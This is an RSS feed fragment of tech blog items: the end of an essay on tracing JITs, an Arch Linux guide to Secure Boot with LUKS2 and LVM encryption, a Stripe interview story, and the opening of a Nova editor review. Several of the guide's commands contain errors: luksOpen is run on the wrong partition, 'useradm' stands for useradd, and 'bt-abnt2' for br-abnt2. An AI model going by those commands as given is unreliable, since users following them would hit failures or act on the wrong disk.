<p>(I should note that I‚Äôm most familiar with the tracing JITs used by TensorFlow and JAX. <a href="https://doc.pypy.org/en/latest/">PyPy</a> and <a href="https://numba.pydata.org/">Numba</a> are two alternate JIT implementations that have a longer history, but I don‚Äôt know enough about them to treat them fairly, so my apologies to readers.)</p>
<p>Tracing unlocks many wins typically reserved for compiled languages. For example, once you have the entire trace in one place, operations can be fused together (e.g., to make use of the <a href="https://en.wikipedia.org/wiki/FMA_instruction_set">fused multiply-add instructions</a> common to most modern computers), memory layouts can be optimized, and so on. TensorFlow‚Äôs <a href="https://www.tensorflow.org/guide/graph_optimization">Grappler</a> is one such implementation of this idea. Traces can also be <a href="https://en.wikipedia.org/wiki/Backpropagation">walked backwards</a> to automatically compute derivatives. Traces can be compiled for different hardware configurations, so that the same Python code executes on CPU, GPU, and TPU. JAX can <a href="https://jax.readthedocs.io/en/latest/notebooks/quickstart.html#Auto-vectorization-with-vmap">autovectorize traces</a>, adding a batch dimension to all operations. Finally, a trace can be exported in a language-agnostic manner, allowing a program defined in Python to be executed in <a href="https://www.tensorflow.org/js">Javascript</a>, <a href="https://www.tensorflow.org/tfx/guide/serving">C++</a>, or more.</p>
<p>Unsurprisingly, there‚Äôs a catch to all this. NumPy can amortize Python overhead over multiple data, but only if that data is the same type. JIT can amortize Python overhead over multiple function calls, but only if the function calls would have resulted in the same pointer chasing outcomes. Retracing the function to verify this would defeat the purpose of JIT, so instead, TensorFlow/JAX JIT uses array shape and dtype to guess at whether a trace is reusable. This heuristic is necessarily conservative, rules out otherwise legal programs, often requires unnecessarily specific shape information, and doesn‚Äôt make any guarantees against mischievous tinkering. Furthermore, data-dependent tracing is a known issue (<a href="https://pytorch.org/docs/stable/generated/torch.jit.trace.html">1</a>, <a href="https://jax.readthedocs.io/en/latest/notebooks/Common_Gotchas_in_JAX.html#python-control-flow-+-JIT">2</a>). I worked on <a href="https://blog.tensorflow.org/2018/07/autograph-converts-python-into-tensorflow-graphs.html">AutoGraph</a>, a tool to address data-dependent tracing. Still, the engineering benefits of a shared tracing infrastructure are too good to pass up. I expect to see JIT-based systems flourish in the future and iron out their user experience.</p>
<h2 id="conclusion">Conclusion</h2>
<p>The NumPy API‚Äôs specifically addresses Python‚Äôs performance problems for the kinds of programs that scientific computing users want to write. It encourages users to write code in ways that minimize pointer overhead. Coincidentally, this way of writing code is a fruitful abstraction for tracing JITs targeting vastly parallel computing architectures like GPU and TPU. (Some people argue that <a href="https://dl.acm.org/citation.cfm?id=3321441">machine learning is stuck in a rut</a> due to this NumPy monoculture.) In any case, tracing JITs built on top of ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.moderndescartes.com/essays/data_oriented_python/">https://www.moderndescartes.com/essays/data_oriented_python/</a></em></p>]]>
            </description>
            <link>https://www.moderndescartes.com/essays/data_oriented_python/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511966</guid>
            <pubDate>Fri, 18 Sep 2020 01:22:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Secure your boot process: UEFI and Secureboot and EFISTUB and Luks2 and lvm]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24511852">thread link</a>) | @zdw
<br/>
September 17, 2020 | https://nwildner.com/posts/2020-07-04-secure-your-boot-process/ | <a href="https://web.archive.org/web/*/https://nwildner.com/posts/2020-07-04-secure-your-boot-process/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>This tutorial isn‚Äôt a basic setup how-to in a way you will learn how to install Arch Linux, neither is intended to replace the <a href="https://wiki.archlinux.org/index.php/Installation_guide">Installation Guide</a>, This is a guide for those who want a laptop with data-at-rest encryption and a verified boot process using SecureBoot.</p>
<p>I‚Äôll not be arrogant saying that this setup is ‚Äútampering-proof‚Äù since this also depends on your firmware manufacturer, but I believe that this is a notebook setup with good enough security.</p>

<ul>
<li>Arch Linux setup overview.</li>
<li>Basic secureboot explanation.</li>
<li>Luks2+lvm setup for encrypted partitions at boot time.</li>
<li><code>/home</code> disk setup with crypttab.</li>
<li>EFISTUB to make Linux ‚Äúit‚Äôs own bootloader‚Äù avoiding the entire <code>/boot</code> to be mounted on your ESP.</li>
</ul>

<p>UEFI is the new standard for boot and firmware management and it isn‚Äôt perfect, but is a natural answer to the old BIOS standard that has it‚Äôs limitations and is not aging well considering those limits and all workarounds involved to break them. You can find more information <a href="https://uefi.org/faq">here</a>. BIOS standard first appeared in IBM computers in 1976 and should (hopefully) die soon.</p>
<p>To keep words/concepts best alligned with what is correct, i‚Äôll not call your basic computer program BIOS but firmware from now on during this reading.</p>
<p>I bought a laptop and wanted to encrypt all my data and thought: ‚ÄúHey, i can do a full disk encryption but what if someone tamper my <a href="https://en.wikipedia.org/wiki/Master_boot_record">MBR/Boot Sector</a>? So, using secureboot whas the best alternative (even with efi having a plain <code>FAT32</code> partition on it‚Äôs standard).</p>
<p>There‚Äôs a lot of drama around secureboot, most of it related to Microsoft and the way they demand deploying their keys on OEM vendor equipments. That doesn‚Äôt mean that secureboot is bad.</p>
<p>Pretty simple ‚Äúexplain like i‚Äôm five‚Äù secureboot concept: A Root of Trust combination with keys and certificates. Using SecureBoot your firmware will check if the operating system you are trying to boot and your bootloader are trusted by you. On each boot-up UEFI firmware will inspect what you are trying to boot and if it‚Äôs not trusted a security violation will be triggered.</p>
<p>There are four main EFI ‚Äúvariables‚Äù used to create a basic secureboot Root of Trust environment:</p>
<ul>
<li>PK: The Platform Key, the master one, the <a href="https://en.wikipedia.org/wiki/One_Ring">ring to rule them all</a>. The holder of a PK can install a new PK and update the KEK.</li>
<li>KEK: Key Exchange Key is a secondary key used to sign EFI executables directly or a key used to signd the db and dbx databases.</li>
<li>db: The signature databse is a list with all allowed signing certificates or criptografy hashes to allowed binaries. We will use THIS db key to sign our Linux Kernel.</li>
<li>dbx: The dark side of the db. Inverse db. ‚Äúnot-good-db‚Äù. You name it. It‚Äôs the list containing all keys that are not allowed.</li>
</ul>
<p>I would like to highlight the following points of this setup:</p>
<ul>
<li>Your signing keys are stored inside an encrypted disk.</li>
<li>Kernel signing will only happend after you have booted and running an already signed kernel.</li>
<li>Most notebooks today don‚Äôt have an exposed CMOS to keep configurations but instead they have nvram modules that will store firmware and configurations.
<ul>
<li>So, put a passord on your firmware to avoid secureboot being disabled.</li>
<li>Putting a password on your firmware will almost invalidate any chance of boot option change or secureboot disable.</li>
<li>In my case there is no ‚Äúreset bios password‚Äù option and losing it will require contacting Lenovo to replace the main board.</li>
</ul>
</li>
<li>Even with secureboot disabled, and attacker will not be able to decrypt your root partition without knowing your password</li>
<li>If you are worried about keys being accessed after booting, you have other issues to solve and disk encryption + secureboot will not be the answer.</li>
<li>Modern processors have <code>aes-ni</code> instuction that will help on disk decryption avoiding high cpu usage for this task.</li>
<li>Using a key to unlock luks <code>/home</code> partition is a way to increase convenience without sacrificing security. That key is stored inside another encrypted partition so, there is no much to worry about.</li>
<li>lvm inside a luks container gives you a lot of flexibility. This will also remove any visibility if someone steal you equipment since lvs will be inside one container.
<ul>
<li>Less error prone setup while manipulating <code>UUID</code>s is also an implicit feature.</li>
</ul>
</li>
</ul>
<p>With that in mind, lets install ArchLinux, first boot it and create the Root of Trust of your notebook.</p>

<p>There‚Äôs a plenty of ‚Äúefi how-tos‚Äù for Arch Linux on the internet, and some of the instructions here will be just an overview of what you dear reader will have to execute</p>
<p><strong>Step 01</strong>: Download Arch Linux <a href="https://www.archlinux.org/download/">here</a> and write it to a pendrive using <code>dd bs=4M if=path/to/archlinux.iso of=/dev/sdx status=progress oflag=sync</code> where<code>sdx</code> is your pendrive. If you are using Windows to create your bootable pendrive <a href="https://sourceforge.net/projects/win32diskimager/">Win32 Disk Imager</a> will help you.</p>
<p><strong>Step 02</strong>: Configure your firmware to boot using UEFI, but keep secure boot disabled. Allow boot from usb and change it to be your first boot device. These instructions are pretty much vendor dependent and can change depending on your equipment.</p>
<p><strong>Step 03</strong>: Boot Arch Linux live usb, and after getting a shell change your keybord layout with the following command: <code>loadkeys br-abnt2</code></p>
<p>After that, connect to your wifi using <code>wifi-menu -o your_device</code>. There is an issue with the latest Arch Linux iso(06/2020) and <code>wifi-menu</code> is not working as expected. If you are using ethernet just ignore this step. Enable ntp sync with <code>timedatectl set-ntp true</code>.</p>
<p><strong>Step 04</strong>: Create <code>luks2</code> containers and <code>lvm2</code> volumes on the first disk. On my laptop i have 2 drives: <code>sda</code> is a ssd while <code>sdb</code> is a spinning disk. Use <code>cgdisk /dev/sda</code> and create a 256MB(i‚Äôm using 512MB but noticed that is way too much) partition for EFI (<a href="https://wiki.archlinux.org/index.php/EFI_system_partition">ESP</a>) code <code>ef00</code> and the rest of your disk space create a partition with code <code>8309</code>(Linux Luks).</p>
<p>Create your luks container and open it. Default block cipher and block encyption mode should be good enough so there is no need of changing it with <code>-c</code> parameter:</p>
<pre><code>cryptsetup -y -v --use-random luksFormat /dev/sda2
cryptsetup luksOpen /dev/sda2 crypt
</code></pre>
<p>Create your lvm infraesturucture on top of it. I‚Äôll create swap and root logical volumes</p>
<pre><code>pvcreate /dev/mapper/crypt
vgcreate vg0 /dev/mapper/crypt
lvcreate --size 4G vg0 --name swap
lvcreate --size 30G vg0 --name root
</code></pre>
<p>Format your ESP, root and swap partitions/volumes</p>
<pre><code>mkfs.vfat -F32 /dev/sda1
mkfs.ext4 /dev/mapper/vg0-root
mkswap /dev/mapper/vg0-swap
</code></pre>
<p><strong>Step 05</strong> Now create a <code>luks2</code> container without lvm on it cause we will use the full disk just for <code>/home</code> and automatically map/mount it using <code>crypttab+fstab</code> here. Instead of typing a password 2 times during boot(one for root, another for home), we will just type the password for the root partition and host a key inside this encrypted partition to open the home luks container. Using a key to open a luks device has the same risks as typing a password and storing it into your ram. <code>cgdisk /dev/sdb</code> and create an all-disk partition using <code>8309</code> partition code.</p>
<pre><code>cryptsetup -y -v --use-random luksFormat /dev/sdb1
cryptsetup luksOpen /dev/sda1 crypthome
mkfs.ext4 /dev/mapper/crypthome
</code></pre>
<p><strong>Step 06</strong> Mount all and start to install:</p>
<pre><code>mount /dev/mapper/vg0-root /mnt
mkdir /mnt/efi
mkdir /mnt/home
mount /dev/sda1 /mnt/efi
mount /dev/mapper/crypthome /mnt/home
pacstrap /mnt base base-devel vim efibootmgr linux linux-firmware lvm2 mkinitcpio networkmanager intel-ucode git
</code></pre>
<p>Do not install <code>intel-ucode</code> if you are using an AMD processor.</p>
<p><strong>Step 07</strong>: Create your <code>fstab</code> and change root to your new system</p>
<pre><code>genfstab -U /mnt &gt;&gt; /mnt/etc/fstab
arch-chroot /mnt
</code></pre>
<p><strong>Step 08</strong>: Change your fstab <code>/home</code> mount point to use the device mapper name. If you try to mount it using <code>UUID</code> it will fail cause it needs to be decrypted first.</p>
<pre><code># /home
/dev/mapper/crypthome	/home     	ext4      	rw,relatime	0 2
</code></pre>
<p>Create a key to automatically open the home luks container. Change the ‚Äúsecretfolder‚Äù path example as you please.</p>
<pre><code>mkdir /root/secretfolder
chmod 700 /root/secretfolder
dd bs=512 count=4 if=/dev/urandom of=/root/secretfolder/crypto_keyfile.bin
</code></pre>
<p>Find the UUID of your home luks container(<code>sdb1</code> not <code>crypthome</code>) and add it to your <code>/etc/crypttab</code>. Crypttab columns are: mapping name(crypthome), luks partition UUID, key path and luks. You can check disks UUID by issuing <code>blkid /dev/yyy</code> where <code>yyy</code> could be a partition or a disk. In this case, use <code>sdb1</code>.</p>
<pre><code>crypthome UUID=29d3555d-cccc-yyyy-xxxx-xxxxxxxxxxxx /root/secretfolder/crypto_keyfile.bin luks
</code></pre>
<p><strong>Step 09</strong>: Configure the rest of the system. Remember, this is just an overview of the Arch Linux installation and the focus here is on the secureboot aspect of this setup. In this step we will configure locale, localtime, keymap, hostname and user. I‚Äôm configuring a setup for a Brazilian Portuguese user so, change this info to reflect your language.</p>
<pre><code>ln -s /usr/share/zoneinfo/America/Sao_Paulo /etc/localtime
hwclock --systohc
echo LANG=pt_BR.UTF-8 &gt; /etc/locale.conf
echo KEYMAP=bt-abnt2 &gt; /etc/vconsole.conf
echo hostname_i_want &gt; /etc/hostname
</code></pre>
<p>Uncomment the <code>pt_BR.UTF-8 UTF-8</code> line inside <code>/etc/locale.gen</code> and generate this localization with:</p>
<pre><code>locale-gen
</code></pre>
<p>Create a password for root, and the basic info for your user(change <code>myuser</code> to your login):</p>
<pre><code>passwd
useradm -m -g users -G wheel myuser
passwd myuser
</code></pre>
<p><strong>Step 10</strong>: Edit your <code>mkinitcpio.conf</code> and include the <code>HOOKS</code> <code>keyboard</code>, <code>keymap</code>, <code>lvm2</code> and <code>resume</code>. Include <code>ext4</code> on <code>MODULES</code> and change <code>COMPRESSION</code> to <code>cat</code>. You can check my config file <a href="https://gitlab.com/nwildner/dotfiles/-/blob/master/etc/mkinitcpio.conf">here</a>. Recreate your initd:</p>
<pre><code>mkinitcpio -p linux
</code></pre>
<p>You may have noticed the <code>i915</code> module on my <code>mkinitcpio.conf</code>. That‚Äôs how you avoid video flickering during the boot process if you are a user of an Intel Integrated graphics card.</p>
<p><strong>Step 11</strong>: Lets check if your motherboard is able to handle EFI entries using the following command:</p>
<pre><code>bootctl status| grep -i "sets"
       ‚úì Boot loader sets ESP partition information
</code></pre>
<p>If this option is marked with <code>‚úì</code> you will be able to set boot information on your motherboard directly. Otherwise, you‚Äôll have to rely on a bootloader like <code>systemd-boot</code>. You could obviously use the default EFI fallback option (<code>EFI/BOOT/BOOX64.EFI</code>) but the sofware we will use to automatically create ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nwildner.com/posts/2020-07-04-secure-your-boot-process/">https://nwildner.com/posts/2020-07-04-secure-your-boot-process/</a></em></p>]]>
            </description>
            <link>https://nwildner.com/posts/2020-07-04-secure-your-boot-process/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511852</guid>
            <pubDate>Fri, 18 Sep 2020 01:00:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Experience Interviewing with Stripe]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24511838">thread link</a>) | @lpolovets
<br/>
September 17, 2020 | https://daeyoungchoi.com/stripe-interview/ | <a href="https://web.archive.org/web/*/https://daeyoungchoi.com/stripe-interview/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	
<p>Interviewing for a job often is a daunting experience. It may commonly be described as a two-way selection process, one in which the candidate is evaluating the company as much as the company is the candidate, but the sober truth is that outside of the most highly sought-after segments of the talent pool, the balance of power resides squarely with the hiring company and the candidate has little leverage until the moment a job offer is presented. This seemingly is especially true in Silicon Valley, where each job opening routinely attracts hundreds of applicants and it is not uncommon that the candidate simply never hears back from the company in the case the interview is deemed unsuccessful at any point along the process, without even a notice of rejection, let alone being provided an explanation or feedback of any kind. Basic decency and decorum can seem to fly out the window once the company makes the determination you are ‚Äúnot a fit,‚Äù which effectively translates to ‚Äúhenceforth a waste of time,‚Äù simply an undesired byproduct of an essential process, to be discarded as quickly as possible.</p>



<p>But every once in a while, as is the case with life in general, an exception comes along that runs against the grain of your learned expectations. It shows you the extraordinary does exist and offers a reminder that much of what happens in this world lies on a distribution, despite the seeming tyranny of what occupy the regions of central tendency. While it won‚Äôt negate the broadly observed norms, the reminder that excellence exists in almost all domains of human activity sometimes is enough to sustain one in a journey that is full of pitfalls and trials, providing the inspiration that helps keep alive hopes and aspirations even when the objective and dispassionate prognosis appears far from welcoming. Interviewing with Stripe, the payment startup, for me, was such an example.</p>



<p>My very first interview with Stripe started off quite inauspiciously. It was a phone interview with the recruiter, and after spending some time to explore and discuss both my background and that of the job, he let me know that my skill set probably was not as good a match for what the hiring team was looking for as initially thought. In retrospect that sort of upfront candor might have been an early indication of the caliber of the organization that was to be revealed more fully later on. But the remarkable thing that happened after he uttered that assessment was that he wanted to refer me to another recruiter, for a different role which he thought presented a better match. This was something that quite literally had never happened in my experience, admittedly a small sample as it may be ‚Äì a recruiter that not only was well-versed enough in another position for which he was not recruiting, was empowered enough by the organization to make that kind of an autonomous referral decision without consultation, but also, probably most impressively, cared enough to take on such an initiative when I was deemed no longer useful for his immediate need, which was to fill the position at hand.</p>



<p>The subsequent interviews, for the new role, went more smoothly, uneventfully in the best sense. Over the course of the ensuing few weeks, in succession, I had a phone call with the new recruiter, a Zoom video call with the head of the business unit for the role (who was based overseas), a writing assignment, and in-person coffee shop chats in San Francisco with the said head of the business unit who happened to be in town that week and also with the hiring manager. All of that led to culminate in an on-site round of interviews with 7 individuals that lasted over 4 hours in January of this year at the San Francisco headquarters of Stripe.</p>



<p>In retrospect, it is clear I did not perform as well on the on-site interviews as I should have. What was unique about Stripe was the interview questions were actually provided in advance ‚Äì the recruiter arranged a call with me prior to the scheduled date to go over the questions one by one. Gripped by the notion, somehow, that interviews are just conversations, however, I did not spend a lot of time preparing specific answers for those questions. Looking back, I now think a big part of the reason why was hubris; I have a tendency to think I enjoy all conversations, and proceeded to draw the conclusion in my mind that conversations I enjoy in an interview setting must be good interviews. The mere fact that I was ready to enjoy the interviews, in their natural, unscripted, conversational formulation, was, in a way, enough preparation. But once the on-site interviews began it became apparent the interviewers were pressing for a higher level of specificity in the answers than I was prepared to give in the courses of casual conversations. I could feel the inadequacy of my answers resulting from the lack of deeper considerations given them in advance, and I simply was not good enough to get to the level of detailed thoughtfulness on the spot. As I was ushered out of the building after the interviews concluded, I recall feeling a sense of regretful uneasiness creeping in. Almost compulsively, I remained hopeful, but far from confident. And surely enough, a few days later I was informed that I didn‚Äôt get the job. </p>



<p>I was devastated, but this is the point from which I was led to Stripe revealing itself to be a truly unique, unconventional company in the most unexpectedly wonderful ways. First, the recruiter offered to schedule a call so we could review the decision. I was pleasantly surprised to be given such an unusual opportunity, so I took him up on it. During the call he relayed some useful feedback, though it is clear in retrospect that I got too excited to be on such a call and spent way more time talking than listening to what he had to say. But importantly, the conversation helped me come to a realization, in concrete ways, that I was a much worse interviewee than had previously believed myself to be. It prompted me to ex-examine my natural tendencies in the ways I think, talk, and engage with others in conversations. When I shared the revelation with my wife, she was more than happy to supply additional pointers in areas of my failing.</p>



<p>The fact that the recruiter, and by extension the company, was willing to engage with and spend the time and effort on someone deemed to be ‚Äúnot wanted‚Äù was an enormous departure from everything I had experienced previously. Frankly, it was the kind of thoughtfulness and generosity of goodwill that I never expected any corporate entity to possess or display. I knew I had been rejected, but now I wanted Stripe even more, and I couldn‚Äôt let myself just give up. So I did something quite silly: I sent an email to the CEO. Fortunately Patrick Collison, Stripe‚Äôs CEO, lists his email address on his personal website. But I had no idea if the email would actually reach him, or if he would read it if it got to him, or if he would respond in any way. The overwhelmingly realistic outcome was that nothing would happen, and I knew it. It was a desperation move, one you are able to make only because you have nothing to lose.</p>



<p>Then, I got an email from the recruiter. He asked if I wanted to speak with the company‚Äôs chief risk officer ‚Äì the job I interviewed for was a risk function ‚Äì for reasons that were not entirely clear. He mentioned I might want ‚Äúa bit more closure,‚Äù but I didn‚Äôt want closure; if anything, I wanted to keep the door ajar as much and as long as possible. He also said that the meeting was optional, with ‚Äúno pressure.‚Äù Perplexed yet intrigued, I took up the opportunity to speak with the executive. She began the call with something to the effect of ‚ÄúI know you reached out to Patrick.‚Äù I had reached out to everyone I had interviewed with to solicit feedback, and since the name ‚ÄúPatrick‚Äù didn‚Äôt register right away I processed it to mean one of the interviewers. But about 5 seconds later I realized there was no one named Patrick that I had met, and then it hit me that it must be Patrick Collison, the CEO. My email to him was why this call was happening, which the chief risk officer confirmed when I asked her in disbelief. I was stunned. Having taken place almost a half year ago, much of the details of the call is a blur. But I recall distinctly her asking why Stripe should hire someone like myself. Most improbably, it seemed, this might be a second chance.</p>



<p>I had written to Patrick the CEO with a proposition: I offered myself to be a counterfactual data point in an evaluation of Stripe‚Äôs hiring process, after learning that Stripe‚Äôs credit card fraud detection system lets through some transactions which its algorithms flag as likely frauds in order to determine whether they turn out to be true positives or false positives ‚Äì thereby evaluating the algorithms themselves ‚Äì in a process called ‚Äúcounterfactual evaluation.‚Äù When the chief risk officer asked why I should be hired, I reiterated that proposition: the case I was making was not about my merits, but the willingness on Stripe‚Äôs part to apply counterfactual evaluation to its hiring process, to determine whether I was a false positive (incorrectly rejected) or a true positive (truly no good) by letting me join Stripe, without a bias to either outcome. I couldn‚Äôt tell if I was making any headway with the argument, but we soon ran out of time and she had to go to another meeting.</p>



<p>In the end, the outcome of my interviews did not change and I remain not an employee of Stripe. But out of all the job interview experiences I‚Äôve had in my life, the one with Stripe stands out as singularly remarkable. When I shared my story with a friend she was so impressed that even though she wasn‚Äôt looking for a new job, she said she still might apply to Stripe just for the experience. Today Stripe has earned a reputation as one of the best embodiments of the ideals of Silicon Valley ‚Äì a place of inventive and ambitious companies that not only come up ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://daeyoungchoi.com/stripe-interview/">https://daeyoungchoi.com/stripe-interview/</a></em></p>]]>
            </description>
            <link>https://daeyoungchoi.com/stripe-interview/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511838</guid>
            <pubDate>Fri, 18 Sep 2020 00:57:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Panic's Nova text editor (a review)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24511824">thread link</a>) | @zdw
<br/>
September 17, 2020 | https://tracks.ranea.org/post/629525278016798720/panics-nova-text-editor-a-review | <a href="https://web.archive.org/web/*/https://tracks.ranea.org/post/629525278016798720/panics-nova-text-editor-a-review">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fpanic.com&amp;t=NTkyMTczNzBiZTJmMjEwYjQyMWE3ODY1MjRlYzU3MDUxNGMyMTRjZSxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600748713">Panic</a>, the long-established makers of Mac utility software, seems fully aware that introducing a new, commercial code editor in 2020 is a quixotic proposition. Is there enough of an advantage to a native editor over both old school cross-platform editors like Emacs and explosively popular new editors like <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fcode.visualstudio.com&amp;t=OWM4YzM3YTYxZjhiYTVkOWM3NDBkMWMwNzczZTdkZjcwNTE2Y2NkZixnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600748713">Visual Studio Code</a> to persuade people to switch?</p><p>I‚Äôm an unusual case as far as text editor users go: my primary job is technical writing, and the last three jobs that I‚Äôve worked at have a ‚Äúdocs as code‚Äù approach, where we write documentation in Markdown and manage it under version control just like source code. The editor that works best for me in tech writing is the venerable <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fwww.barebones.com%2Fproducts%2Fbbedit%2Findex.html&amp;t=OTJiNjJhYWIwMjhkOTNiY2ZiNzc4ZmQ4MjFkOTg3OGUxOTNmNWViYSxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600748713">BBEdit</a>. When it comes to editing <em>code,</em> though, BBEdit lags behind. My suspicion is that BBEdit‚Äôs lack of an integrated package manager has hurt it here. Also, BBEdit‚Äôs language modules don‚Äôt support extending one another, making it effectively impossible to do full highlighting for a templating language like <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Freactjs.org%2Fdocs%2Fintroducing-jsx.html&amp;t=ZWMwZjY0OTc0YTYyYzMyMzNjOGVkOTQ3ZWFkZDQwM2I3N2NkMjFmMixnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600748713">JSX</a> or <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fpalletsprojects.com%2Fp%2Fjinja%2F&amp;t=NWZiNjUzMWU5NmZjOTc5NWRkNDNkYWQ1MTQ1MjdhMGYwZGEzYWY0YSxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600748713">Jinja</a>.</p><p>When I was a web programmer, I was one of many who moved to <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmacromates.com%2F&amp;t=ZjZlOTFmM2M4NTQxZWI5ZWFjMjk4MGNjNjg4NzE2YjdhMzU3ZjJlYixnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600748713">TextMate</a>, and used it for everything for a while. When the Godot-like wait for TextMate 2.0 became unbearable, I wandered the text editing wilderness, eventually splitting my loyalties between BBEdit, <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.sublimetext.com%2F&amp;t=ZDZhY2EwNTdiYTYzOTBjMmRjZDEyMmFiYWE0YjAwNjY5YTk4NWUzMSxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600748713">Sublime Text</a>, and more recently VS Code. At this point, I suspect nothing will pull me away from BBEdit for technical writing, but for programming I‚Äôm open to persuasion.</p><h2 id="so-meet-nova">So: meet Nova.</h2><figure data-orig-height="2096" data-orig-width="2192" data-orig-src="https://micro.coyotetracks.org/uploads/2020/0d33432bcb.png"><img src="https://64.media.tumblr.com/71bc06b690da9776b15d551318a514f0/d722421a61f4e9d6-93/s1280x1920/fb42d548cc1d17dee9a5c099241dfa4bbf6e83e0.png" alt="A screenshot of Nova's main window, showing its sidebar and a Ruby file." title="nova-main-window-2x.png" width="1096" height="1048" data-orig-height="2096" data-orig-width="2192" data-orig-src="https://micro.coyotetracks.org/uploads/2020/0d33432bcb.png"></figure><p>I‚Äôve been using Nova off and on in beta for months. I‚Äôve reported some bugs, although I may mention a couple here that I didn‚Äôt catch until after 1.0‚Äôs release. And, I‚Äôm going to compare it to the GUI editors that I‚Äôve been using recently: BBEdit, Sublime Text, and VS Code.</p><p>Nova is a <em>pretty</em> editor, as far as such things go, and with files of relatively reasonable size it‚Äôs fast. With stupid huge files its performance drops noticeably, though. This isn‚Äôt just the ridiculous 109MB, nearly 450,000-line SQL file I threw at it once, it‚Äôs also with a merely 2MB, 50,000-line SQL file, and Nova‚Äôs offer to turn off syntax highlighting in both files didn‚Äôt help it much. This may sound like a silly test, but in my day job I‚Äôm occasionally stuck editing an 80,000-line JSON file by hand (don‚Äôt ask). This is something BBEdit and VS Code can do without complaint. Panic wrote their own text editing engine for Nova, which is brave, but it needs more tuning for pathological cases like these. They may not come up often, but almost every programmer has <em>one</em> stupid huge file to deal with.</p><p>Nova has an integrated terminal <em>and</em> an integrated SSH client, and even an integrated file transfer system based on Panic‚Äôs <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.panic.com%2Ftransmit%2F&amp;t=ZjIwZTYzMmQ4ZjhhM2I4N2IzZjQ5NzQ2YWJjMDg0N2JjODcxZjJhNCxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600748713">Transmit</a>. In fact, if you have Transmit and use <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fpanic.com%2Fsync%2F&amp;t=YjUwOWUyY2MxOWNlZTc2ZGEzOGNmMjgzODQwOWMyMWU3ZTcwMDYxMCxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600748713">Panic Sync</a>, it knows all of those servers out of the box. Nova has a <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Flibrary.panic.com%2Fnova%2Frun-tasks%2F&amp;t=NzQ5YjdlNjI5Mzg5YTIxOTMzNzRhOTAwZWI4OWQ0YmRlMDI3MDU3MCxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600748713">task workflow system</a> for automating building and running. You can associated servers, tasks, and more with individual projects; Nova‚Äôs project settings are considerably more comprehensive than I‚Äôve seen in other editors. You can even set up <a 